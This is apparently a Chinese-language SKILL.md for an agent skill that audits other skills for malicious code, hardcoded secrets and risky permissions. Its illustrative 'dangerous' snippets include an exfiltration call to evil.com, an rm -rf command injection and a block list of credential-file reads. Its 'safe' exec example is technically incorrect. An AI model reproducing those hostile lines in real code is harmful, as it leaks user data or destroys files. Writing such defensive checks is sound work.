---
name: skill-security-auditor
description: 审查技能安全性，检测恶意代码、危险操作、敏感信息泄露。在创建、安装或使用新技能时自动触发，确保系统安全。
---

# Skill Security Auditor

技能安全审查工具，防止恶意程序和不安全代码。

## 🔒 审查项目

### 1. 恶意代码检测
- [ ] 系统命令执行 (`exec`, `spawn`, `system`)
- [ ] 文件删除操作 (`rm`, `unlink`, `rmdir`)
- [ ] 网络请求（未经授权的 API 调用）
- [ ] 环境变量读取（敏感信息）
- [ ]  Base64 编码/混淆代码

### 2. 敏感信息泄露
- [ ] 硬编码 API 密钥
- [ ] 密码/令牌
- [ ] 私有路径暴露
- [ ] 用户数据收集

### 3. 权限检查
- [ ] 是否需要 elevated 权限
- [ ] 是否修改系统文件
- [ ] 是否访问受限目录

## 🛠️ 用法

### 命令行审查
```bash
# 审查单个技能
node skills/skill-security-auditor/scripts/audit.js skills/<skill-name>

# 审查所有技能
node skills/skill-security-auditor/scripts/audit-all.js

# 生成报告
node skills/skill-security-auditor/scripts/audit.js skills/<skill-name> --report
```

### 程序化使用
```javascript
const auditor = require('./skills/skill-security-auditor');

// 审查技能
const result = await auditor.auditSkill('skills/my-skill');
console.log(result.safe); // true/false
console.log(result.issues); // 问题列表
```

## 📊 风险等级

| 等级 | 说明 | 行动 |
|------|------|------|
| 🟢 安全 | 无发现问题 | 可直接使用 |
| 🟡 注意 | 有潜在风险但合理 | 人工审查 |
| 🔴 危险 | 发现恶意代码 | 禁止使用 |

## ⚠️ 常见危险模式

### 1. 命令注入
```javascript
// ❌ 危险
exec(`rm -rf ${userInput}`);

// ✅ 安全
exec(['rm', '-rf', sanitizedPath]);
```

### 2. API 密钥硬编码
```javascript
// ❌ 危险
const API_KEY = "sk-1234567890abcdef";

// ✅ 安全
const API_KEY = process.env.API_KEY;
```

### 3. 隐蔽网络请求
```javascript
// ❌ 危险 - 发送到未知服务器
fetch('http://evil.com/steal?data=' + userData);

// ✅ 安全 - 明确的目的
fetch('https://api.trusted.com/endpoint', { method: 'POST' });
```

## 📋 审查清单

在技能发布/安装前必须完成：

```
[ ] 无硬编码密钥
[ ] 无危险系统调用
[ ] 网络请求有明确目的
[ ] 文件操作在安全范围内
[ ] 无数据外泄风险
[ ] 错误处理完善
[ ] 日志不包含敏感信息
```

## 🔧 自动化规则

### 自动禁止的模式
- `eval()` 执行动态代码
- `child_process.exec` 带用户输入
- 删除 `/etc`, `/root`, `~/.ssh` 等系统目录
- 读取 `/etc/passwd`, `~/.ssh/id_rsa` 等敏感文件

### 需要人工审查的模式
- 任何 `exec` / `spawn` 调用
- 网络请求到非标准端口
- Base64 编码的可执行代码
- 动态 `require()` / `import()`

## 📁 输出示例

```json
{
  "skill": "my-skill",
  "safe": false,
  "risk_level": "high",
  "issues": [
    {
      "type": "hardcoded_secret",
      "file": "index.js",
      "line": 15,
      "description": "发现硬编码 API 密钥",
      "severity": "high"
    },
    {
      "type": "dangerous_exec",
      "file": "scripts/run.sh",
      "line": 8,
      "description": "exec 调用包含未过滤的用户输入",
      "severity": "critical"
    }
  ],
  "recommendations": [
    "使用环境变量存储 API 密钥",
    "使用 execFile 替代 exec 并参数化输入"
  ]
}
```

## 🚀 集成到工作流

### 技能发布前
```bash
# 自动审查
npm run prepack = audit-skill

# package.json 脚本
{
  "scripts": {
    "prepack": "node ../skill-security-auditor/scripts/audit.js ."
  }
}
```

### CI/CD 集成
```yaml
# GitHub Actions 示例
- name: Security Audit
  run: node skills/skill-security-auditor/scripts/audit-all.js
```

## 📚 参考

- [Node.js 安全最佳实践](https://nodejs.org/en/security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Snyk 漏洞数据库](https://snyk.io/vuln/)
